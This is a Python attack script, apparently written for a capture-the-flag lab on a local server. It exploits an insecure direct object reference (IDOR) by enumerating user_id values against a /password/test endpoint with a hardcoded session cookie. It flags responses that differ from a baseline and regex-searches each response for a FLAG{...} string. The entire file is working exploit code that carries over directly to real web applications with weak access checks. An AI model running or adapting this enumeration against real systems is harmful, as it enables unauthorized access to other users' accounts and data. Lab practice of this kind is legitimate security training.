#!/usr/bin/env python3
"""
IDOR fuzzing script for /password/test endpoint using GET requests
Searches for valid user_id values that reveal different content
"""

import requests
import json
import time
import re

# Configuration
BASE_URL = "http://127.0.0.1:33200/password/test"
COOKIE = {"session": "eyJ1c2VyX2lkIjoxMDAzMn0.aVfTUQ.G8of8DB4VyuHWQyIuFLZdoZkdiI"}
VALID_USER_ID = "10032"

# Test ranges focusing on areas around known valid IDs
ranges = [
    (1, 200, "low_range"),      # Test first 200 users
    (10000, 10100, "target_range")  # Area around our valid user 10032
]

print("=" * 80)
print("IDOR FUZZING - GET /password/test")
print("=" * 80)
print(f"Testing ranges: 1-200, 10000-10100")
print("=" * 80)

# Get baseline response first
print("\n[+] Getting baseline response with valid user_id=10032...")
baseline_response = requests.get(
    BASE_URL,
    cookies=COOKIE,
    params={"user_id": VALID_USER_ID},
    timeout=5
)
baseline_length = len(baseline_response.text)
baseline_status = baseline_response.status_code
print(f"Baseline: Status={baseline_status}, Length={baseline_length}")

# Store results
valid_ids = []
flag_found = False

# Fuzz the user_id parameter
for start, end, range_name in ranges:
    print(f"\n{'='*80}")
    print(f"Testing range: {start}-{end}")
    print(f"{'='*80}")
    
    for user_id in range(start, end + 1):
        try:
            response = requests.get(
                BASE_URL,
                cookies=COOKIE,
                params={"user_id": str(user_id)},
                timeout=5
            )
            
            status_code = response.status_code
            response_length = len(response.text)
            
            # Check for FLAG pattern
            if "FLAG{" in response.text:
                flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
                if flag_match:
                    flag_value = flag_match.group(0)
                    print(f"\n[!!!] FLAG FOUND at user_id={user_id}")
                    print(f"[!!!] Flag: {flag_value}")
                    print(f"[!!!] Status: {status_code}, Length: {response_length}")
                    flag_found = True
            
            # Track responses that differ from baseline
            if response_length != baseline_length and status_code == 200:
                size_diff = abs(response_length - baseline_length)
                valid_ids.append({
                    "user_id": user_id,
                    "status": status_code,
                    "length": response_length,
                    "diff": size_diff
                })
                
                # Only print non-baseline IDs that return different content
                if user_id != int(VALID_USER_ID):
                    print(f"[+] Interesting response at user_id={user_id}")
                    print(f"    Length: {response_length}, Diff: {size_diff}")
                    
                    # If response is very different, show snippet
                    if size_diff > 100:
                        snippet = response.text.replace('\n', ' ').replace('\r', '')[:200]
                        print(f"    Snippet: {snippet}")
            
        except Exception as e:
            print(f"[-] Error testing user_id={user_id}: {e}")
            continue

print("\n" + "=" * 80)
print("FUZZING COMPLETE")
print("=" * 80)
print(f"Total valid IDs found: {len(valid_ids)}")

if flag_found:
    print("\n[✓] FLAG SUCCESSFULLY DISCOVERED!")
else:
    print("\n[✗] No flag found in tested range")

# Show summary of discovered valid IDs
if valid_ids:
    print("\n[+] Valid IDs discovered:")
    for entry in sorted(valid_ids, key=lambda x: x['diff'], reverse=True)[:10]:
        print(f"  user_id={entry['user_id']}: length={entry['length']}")
